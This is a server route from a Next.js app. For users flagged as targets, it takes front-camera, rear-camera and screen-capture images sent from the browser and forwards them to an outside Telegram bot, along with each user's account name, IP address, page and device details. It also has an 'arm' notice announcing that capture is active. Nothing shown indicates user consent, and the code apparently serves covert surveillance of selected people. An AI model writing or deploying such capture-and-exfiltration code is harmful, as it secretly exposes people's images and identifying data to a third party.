import { NextRequest, NextResponse } from 'next/server';

import { getAuthInfoFromCookie } from '@/lib/auth';
import { resolveEntryChatId } from '@/lib/entry/telegram';
import { entryCaptureFor } from '@/lib/huangguo/access';
import { recordEntry } from '@/lib/huangguo/server';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

const browserOf = (ua: string): string => {
  if (/Edg\//.test(ua)) return 'Edge';
  if (/OPR\//.test(ua)) return 'Opera';
  if (/MicroMessenger\//.test(ua)) return '微信';
  if (/Quark\//.test(ua)) return '夸克';
  if (/Chrome\//.test(ua)) return 'Chrome';
  if (/Safari\//.test(ua)) return 'Safari';
  return '未知浏览器';
};

const osOf = (ua: string): string => {
  if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
  if (/Android/i.test(ua)) return 'Android';
  if (/Windows/i.test(ua)) return 'Windows';
  if (/Mac OS X/i.test(ua)) return 'macOS';
  if (/Linux/i.test(ua)) return 'Linux';
  return '未知';
};

const dataUrlToBlob = (dataUrl: string): Blob | null => {
  const m = dataUrl.match(/^data:(image\/[a-z+.-]+);base64,(.+)$/i);
  if (!m) return null;
  const bin = atob(m[2]);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return new Blob([bytes], { type: m[1] });
};

export async function POST(req: NextRequest) {
  let body: {
    photo?: string;
    photoBack?: string;
    screen?: string;
    label?: string;
    path?: string;
    kind?: string;
  };
  try {
    body = (await req.json()) as {
      photo?: string;
      photoBack?: string;
      screen?: string;
      label?: string;
      path?: string;
      kind?: string;
    };
  } catch {
    return NextResponse.json({ ok: false }, { status: 400 });
  }
  if (!body.photo && body.kind !== 'arm') {
    return NextResponse.json({ ok: false }, { status: 400 });
  }

  const auth = getAuthInfoFromCookie(req);
  if (!(await entryCaptureFor(auth?.username, auth?.role))) {
    return NextResponse.json({ ok: true, skipped: 'not-target' });
  }
  const username = auth?.username || '未登录';

  const ip =
    req.headers.get('cf-connecting-ip') ||
    (req.headers.get('x-forwarded-for') || '').split(',')[0].trim() ||
    '未知';
  const ua = req.headers.get('user-agent') || '';
  const now = new Date();
  const caption = [
    '🎬 操作留影',
    `时间：${now.toLocaleString('zh-CN', { hour12: false })} (UTC+8)`,
    `账号：${username}`,
    `IP：${ip}`,
    `页面：${body.path || ''}`,
    `操作：${body.label || ''}`,
    `设备：${osOf(ua)} · ${browserOf(ua)}`,
    `照片：前置${body.photoBack ? ' + 后置' : '（无后置摄像头）'}${body.screen ? ' + 屏幕截图' : '（无屏幕共享）'}`,
  ].join('\n');

  const token = process.env.TG_ENTRY_BOT_TOKEN || '';
  if (!token) return NextResponse.json({ ok: true, telegram: 'no token' });
  const chatId = await resolveEntryChatId(token);
  if (!chatId) return NextResponse.json({ ok: true, telegram: 'no chat' });

  // 布防通知：纯文字，确认该会话留影已生效
  if (body.kind === 'arm') {
    const armCaption = [
      '🛰 操作留影已布防',
      `时间：${now.toLocaleString('zh-CN', { hour12: false })} (UTC+8)`,
      `账号：${username}`,
      `IP：${ip}`,
      `页面：${body.path || ''}`,
      `设备：${osOf(ua)} · ${browserOf(ua)}`,
    ].join('\n');
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: armCaption }),
    }).catch(() => undefined);
    recordEntry(req, { ip, loc: '', model: `${osOf(ua)} · ${browserOf(ua)}`, user: username });
    return NextResponse.json({ ok: true, telegram: 'sent' });
  }

  const blob = dataUrlToBlob(body.photo || '');
  if (!blob) return NextResponse.json({ ok: false }, { status: 400 });
  const backBlob = body.photoBack ? dataUrlToBlob(body.photoBack) : null;
  const screenBlob = body.screen ? dataUrlToBlob(body.screen) : null;
  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', caption);
  form.append('front.jpg', blob, 'front.jpg');
  const media: { type: string; media: string }[] = [
    { type: 'photo', media: 'attach://front.jpg' },
  ];
  if (backBlob) {
    form.append('back.jpg', backBlob, 'back.jpg');
    media.push({ type: 'photo', media: 'attach://back.jpg' });
  }
  if (screenBlob) {
    form.append('screen.jpg', screenBlob, 'screen.jpg');
    media.push({ type: 'photo', media: 'attach://screen.jpg' });
  }
  if (media.length > 1) {
    form.append('media', JSON.stringify(media));
    await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
      method: 'POST',
      body: form,
    }).catch(() => undefined);
  } else {
    form.append('photo', blob, 'front.jpg');
    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
      method: 'POST',
      body: form,
    }).catch(() => undefined);
  }

  recordEntry(req, { ip, loc: '', model: `${osOf(ua)} · ${browserOf(ua)}`, user: username });
  return NextResponse.json({ ok: true, telegram: 'sent' });
}
